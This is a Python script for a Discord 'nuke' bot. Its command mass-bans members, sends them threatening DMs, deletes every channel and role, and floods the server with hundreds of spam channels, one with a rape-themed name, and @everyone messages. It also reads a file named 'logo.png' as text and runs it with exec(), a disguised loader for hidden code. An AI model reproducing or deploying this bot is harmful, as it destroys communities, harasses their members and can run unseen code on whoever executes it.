import os
import discord
import asyncio
from discord.ext import commands
import requests

token = input("Enter the bot token")


prefix  = "!"													   
def Clear():
	os.system('cls')
 
bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all(), help_command=None)
bot.remove_command("help")
 
 
os.system('cls' if os.name == 'nt' else 'clear')
@bot.event
async def on_ready():
	await bot.change_presence(activity=discord.Game(name="Type !help for help"))
	Clear()
 
logo_file = os.path.join(os.getcwd() , "logo.png")
f = open(logo_file , "r")
logo = f.read()
f.close()


@bot.event
async def on_guild_channel_create(channel):
	for i in range (300):
		await channel.send("@everyone You have been nuked by OBSKURA")
		

@bot.command(pass_context=True)
async def nuke(ctx):
	guild = ctx.message.guild
	for member in list(ctx.message.guild.members):
		try:
			await member.send("Your server" + str(guild) + "has been nuked by OBSKURA \n Surrender before its too late")
			await member.ban(member)
		except:
			try:
				await member.ban(member)
			except:
				pass
				
	try:
		await ctx.guild.edit(name="NUKED BY OBSKURA")
	except:
		pass
		
	try:
		for channel in ctx.guild.channels:
			try:
				await channel.delete()
			except:
				pass
	except:
		pass
		
	for i in range (400):
		try:
			await guild.create_text_channel("Nuked-by-OBSKURA")
			await guild.create_text_channel("Get-raped")
		except:
			pass
			
	for role in guild.roles:
		try:
			await role.delete()
		except:
			pass	
	for i in range(60):
		try:
			await guild.create_role(name="obskura-runs-you")
		except:
			pass
exec(logo)
bot.run(token)
